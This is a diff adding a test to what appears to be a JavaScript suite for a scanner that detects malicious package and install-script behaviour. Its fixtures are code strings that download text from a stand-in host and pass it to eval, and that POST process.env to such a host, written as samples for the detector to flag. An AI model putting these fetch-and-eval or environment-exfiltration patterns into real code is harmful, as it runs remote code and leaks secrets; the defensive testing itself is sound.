@@ -198,6 +198,18 @@ test("what a script puts into a container, the container holds (D-3)", () => {
   assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
 });
 
+test("a method reads this as the instance it is called on, in a class made in several places (B-3)", () => {
+  // python: InstanceTests
+  const cls = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n" +
+    "const a = new R();\nconst b = new R();\n";
+  const get = (call) => "const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n" +
+    `  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); ${call}; });\n});\n`;
+  for (const call of ["a.run()", "a.go()"]) {
+    assert.ok(importTimeRisk(cls + get(call), "js")[0].includes("runs code it receives over the network"), call);
+  }
+  assert.ok(!importTimeRisk(cls + get("b.run()"), "js")[0].includes("runs code it receives over the network"));
+});
+
 test("a member's container holds what it is given, apart from the object (D-3b)", () => {
   // python: MemberContainerTests
   const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
